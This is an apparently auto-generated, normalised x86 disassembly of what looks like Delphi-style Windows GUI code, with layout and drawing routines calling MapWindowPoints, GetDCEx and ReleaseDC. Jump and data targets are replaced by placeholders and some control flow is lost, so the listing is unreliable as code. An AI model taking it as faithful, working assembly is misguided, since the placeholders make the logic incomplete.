mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_424cd8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_4253f8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx edi
call sub_425398
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_425398
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424cd8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_425398
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_425398
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45bad0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax esi
call sub_418448
call sub_432228
lea ecx [ ebp - 0xc ]
mov edx ebx
call sub_4324d4
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x8 ]
call sub_425714
push eax
call sub_432228
lea ecx [ ebp - 0xc ]
pop edx
call sub_4323ec
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45bb2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_45b9b4
pop ecx
call sub_432228
call sub_432330
test al al
je r-xdata
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_45b9b4
pop ecx
call sub_432228
call sub_432330
test al al
je r-xdata
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_45ba48
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_45ba48
pop ecx
push ebp
mov edx [ ebx + 0x8 ]
mov ecx [ ebp - 0x4 ]
sub edx [ ecx + 0x18 ]
sub edx 0x2
push edx
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0xa
push edx
mov ecx eax
inc ecx
mov edx [ ebx ]
add edx 0x2
mov al 0x2
call sub_45bad0
pop ecx
jmp r-xdata
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_45ba48
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_45ba48
pop ecx
jmp r-xdata
push ebp
mov eax [ ebx ]
mov edx eax
add edx 0xa
push edx
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx [ edx + 0x18 ]
inc ecx
mov edx eax
inc edx
mov al 0x3
call sub_45bad0
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45bc80
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_425108
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45bda4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44f140
mov eax [ ebp - 0x4 ]
call sub_4253d0
xor eax eax
push ebp
push sub_45bd87
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42579c
xor eax eax
push ebp
push sub_45bd6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_4546e8
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45bd71
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42579c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0x94 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4546ac
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4501b4
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
sub_45bdb4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_457040
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_450254
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_450210
mov ecx eax
xor edx edx
xor eax eax
call sub_418448
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4585f8
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
movzx eax [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0xc
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
movzx edx [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov ecx 0x2
add eax 0x8
push eax
mov eax [ eax ]
cdq
idiv ecx
pop edx
mov [ edx ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418470
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_45bf30
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_45bf30
pop ecx
mov eax ebx
call sub_404650
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_45bf30
pop ecx
sub_45bf64
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_45bf30
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_404650
xor eax eax
mov [ esi + 0x64 ] eax
sub_45bfc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45adac
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_45c000
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x90 ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
sub_45c000
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_45c291
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_407550
mov edx [ ebp - 0x8 ]
pop eax
call sub_405818
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
mov eax [ ebx + 0x14 ]
call sub_45a500
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_407550
mov edx [ ebp - 0x10 ]
pop eax
call sub_405818
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
call sub_404ec4
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c298
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_45a8dc
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_45aa58
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_45aa94
mov eax [ ebx + 0x18 ]
call sub_45a8dc
mov [ edx + 0x18 ] eax
push esi
push sub_45c910
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_45ae14
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_45aa94
mov eax [ esi + 0x64 ]
call sub_45aa58
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_404650
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_45c8e8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_404650
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_45a5b8
mov edx eax
mov eax edi
call sub_45aa80
mov eax edi
call sub_45a8dc
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_404650
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x18 ]
mov [ eax + 0x18 ] edx
mov edx [ edi + 0x8 ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
push esi
push sub_45c910
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_45ae14
jmp r-xdata
mov edx [ edi + 0x8 ]
mov edx [ edx + 0x18 ]
mov [ edx + 0xc ] eax
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
push esi
push sub_45c910
mov edx [ eax + 0x14 ]
mov eax esi
call sub_45ae14
mov eax [ ebx + 0x14 ]
call sub_404650
mov eax edi
call sub_404650
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_45c2a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_457040
test eax eax
jle r-xdata
cmp [ edi + 0x38 ] 0x0
jne r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
movzx edx [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_409954
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_45aa80
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_456fac
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_45aa80
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_45c790
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_45c910
xor edx edx
mov eax edi
call sub_45ae14
sub_45c388
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_45aa58
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_403450
mov edx eax
mov eax ebx
call sub_45aa80
sub_45c3c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_45c437
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
sub eax 0x4
mov eax [ eax ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c43e
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45c444
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45c544
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebx + 0x20 ]
call sub_45d084
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_45c444
pop ecx
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_45a7e4
mov eax [ ebp - 0xc ]
call sub_45c3c8
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c54b
lea eax [ ebp - 0xc ]
call sub_405530
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_45c444
pop ecx
sub_45c554
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45c6fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x74 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
lea edx [ eax + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45c674
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_456fac
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0x10 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c67b
mov eax [ ebp - 0x14 ]
call sub_404650
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_45c3c8
pop ecx
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_456fc0
mov esi eax
cmp [ esi + 0x57 ] 0x0
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_45c67b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x74 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
movzx edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov ecx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x8 ]
call sub_45d084
mov [ ebp - 0xc ] eax
jmp r-xdata
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_45c444
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45c702
lea eax [ ebp - 0x18 ]
call sub_405530
retn
sub_45c708
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45ab34
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ab5c
call sub_45c708
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45ab34
call sub_45c708
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_45a538
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_45aa58
mov edx eax
mov eax ebx
call sub_45aa80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_45aa80
jmp r-xdata
sub_45c790
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_45c708
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_45c7d8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_45aa58
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_45aa80
sub_45c80c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_4585f8
mov edx eax
mov eax [ rw-data ]
call sub_45d63c
mov eax [ ebx + 0x14 ]
call sub_4585f8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_45c934
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45c86c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_45d63c
mov eax ebx
call sub_45c934
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_45aa80
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_45aa80
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_45c790
push ebx
push sub_45c910
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_45ae14
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_45c8e8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_456fac
test eax eax
jle r-xdata
push ebx
push sub_45c910
xor edx edx
mov eax ebx
call sub_45ae14
sub_45c934
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_45a600
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_45a600
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_45a684
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
